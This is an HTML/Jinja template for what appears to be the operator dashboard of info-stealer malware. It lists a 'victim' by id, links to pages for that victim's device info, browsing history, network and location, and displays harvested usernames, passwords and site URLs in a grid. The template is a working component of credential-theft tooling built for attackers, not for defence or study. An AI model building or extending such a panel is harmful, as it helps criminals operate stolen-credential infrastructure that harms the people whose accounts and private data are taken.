<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/static/passcookies.css">
    <title>Password Cookies - User Settings</title>
</head>
<body>
    <div class="container">
        <header>
            <div class="admin-profile">
                <div class="profile-image">
                    <img src="/static/image/admin-profil.jpg" alt="Admin Profile Picture">
                </div>
                <h2>Admin</h2>
            </div>
        </header>
        <aside class="sidebar">
            <nav class="sidebar-nav">
                <a class="nav-item" href="/overview?id={{ victim.id }}">Overview</a>
                <a class="nav-item" href="/device?id={{ victim.id }}">Device Info</a>
                <a class="nav-item" href="/history?id={{ victim.id }}">History</a>
                <a class="nav-item" href="/network?id={{ victim.id }}">Network</a>
                <a class="nav-item" href="/location?id={{ victim.id }}">Location</a>
                <a class="nav-item active" href="/passcookies?id={{ victim.id }}">Pass Cookies</a>
            </nav>
            <div class="logout-section">
                <a href="/logout" class="logout-btn">
                    <img src="/static/image/logout-icon.png" alt="Logout Icon" class="logout-icon">
                    Logout
                </a>
            </div>
        </aside>

        <main class="info-grid">
            <h1 class="title">Password Cookies</h1>
            <div class="grid-container">
                {% for item in passcookies_data %}
                    <div class="info-box gray">
                        <div>
                            <p><strong>Username:</strong> {{ item.username }}</p>
                            <p><strong>Password:</strong> {{ item.password }}</p>
                            <p><strong>Url:</strong> <a href="{{ item.url }}" target="_blank">{{ item.url }}</a></p>
                        </div>
                    </div>
                {% endfor %}
            </div>
        </main>
    </div>
</body>
</html>
